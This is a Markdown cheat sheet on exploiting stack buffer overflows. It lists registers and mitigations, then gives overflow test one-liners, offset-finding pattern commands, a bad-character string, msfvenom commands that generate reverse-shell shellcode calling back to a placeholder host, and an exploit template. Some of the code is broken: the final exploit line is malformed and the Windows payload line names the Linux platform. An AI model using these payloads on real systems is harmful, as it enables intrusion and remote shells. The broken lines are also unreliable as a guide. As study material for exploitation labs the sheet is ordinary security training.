# Buffer Overflows

## Register

> Data registers

|32-bit Register|64-bit Register|Description|
|-|-|-|
|EAX|RAX|Accumulator is used in input/output and for arithmetic operations|
|EBX|RBX|Base is used in indexed addressing|
|ECX|RCX|Counter is used to rotate instructions and count loops|
|EDX|RDX|Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values|

> Pointer registers

|32-bit Register|64-bit Register|Description|
|-|-|-|
|EIP|RIP|Instruction Pointer stores the offset address of the next instruction to be executed|
|ESP|RSP|Stack Pointer points to the top of the stack|
|EBP|RBP|Base Pointer is also known as Stack Base Pointer or Frame Pointer thats points to the base of the stack|

## Prevention Techniques and Mechanisms

### Canaries

The canaries are known values written to the stack between buffer and control data to detect buffer overflows. The principle is that in case of a buffer overflow, the canary would be overwritten first and that the operating system checks during runtime that the canary is present and unaltered.

### Address Space Layout Randomization (ASLR)

Address Space Layout Randomization (ASLR) is a security mechanism against buffer overflows. It makes some types of attacks more difficult by making it difficult to find target addresses in memory. The operating system uses ALSR to hide the relevant memory addresses from us. So the addresses need to be guessed, where a wrong address most likely causes a crash of the program, and accordingly, only one attempt exists.

### Data Execution Prevention (DEP)

DEP is a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.

### Check for security mechanism for linux

### ASLR

```bash
sysctl kernel.randomize_va_space
```

If it return `2` then ASLR is enabled.

If it return `0` then ASLR is disabled.

### Binary security

```bash
checksec ./file
```

## Tools

### Windows

- idaPro <https://www.hex-rays.com/products/ida/index.shtml>
- x64dbg <https://github.com/x64dbg/x64dbg/releases/tag/snapshot>
- ERC
  - <https://github.com/Andy53/ERC.Xdbg/releases/tag/32>
  - <https://github.com/Andy53/ERC.Xdbg/releases/tag/64>

### Linux/Unix

- gdb/gef
- edb (GUI version of gdb)
- metasploit:
  - pattern_create.rb
  - pattern_offset.rb
  - msfvenom

## Exploit test

### Pass as argument

```bash
./vuln $(python -c 'print("A"*64 + "\xde\xad\xbe\xef")') 
```

### Pass to a gets() or scanf()

```bash
python -c 'print("A"*64 + "\xde\xad\xbe\xef")' | ./vuln 
```

### Pass as an environment variable

```bash
export EnvVar=$(python -c 'print("A"*64 + "\xde\xad\xbe\xef")')
./vuln
```

## Get buffer size

### metasploit

> Generate pattern

```bash
/opt/metasploit/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
```

> Match pattern

```bash
/opt/metasploit/tools/exploit/pattern_offset.rb -q 0xf7e729c8
```

### ERC

> Generate pattern

```cmd
ERC --pattern create 1200
```

> Match pattern

```cmd
ERC --pattern offset B5eB
```

### GEF

> Generate pattern

```cmd
gef➤  pattern create 300
```

> Match pattern

```cmd
gef➤  pattern search 0xf7e729c8
```

## Bad chars

```bash
./vuln $(python -c 'print("A"*64 + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")')
```

### Generating shellcode without bad chars

```bash
msfvenom -p linux/x86/shell_reverse_tcp EXITFUNC=thread LHOST=LOCAL_IPADDRESS LPORT=LOCAL_PORT --format c --arch x86 --platform linux --bad-chars "\x00"
msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=LOCAL_IPADDRESS LPORT=LOCAL_PORT --format c --arch x86 --platform linux --bad-chars "\x00"
```

Note: `EXITFUNC=thread` help to avoid killing the process when the shellcode is executed.

## Exploit

```bash
./vuln $(python -c 'print("A"*4 + ("\x90" * (BUFFER_SIZE - 4 - EXPLOIT_SIZE - 4))"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "VAR_ARDDRESS_EIP/RIP")')
```

## Gen asm instruction

/opt/metasploit/tools/exploit/nasm_shell.rb

```bash
nasm > inc eax
nasm > jmp eax
nasm > ASM_INSTRUCTION
```
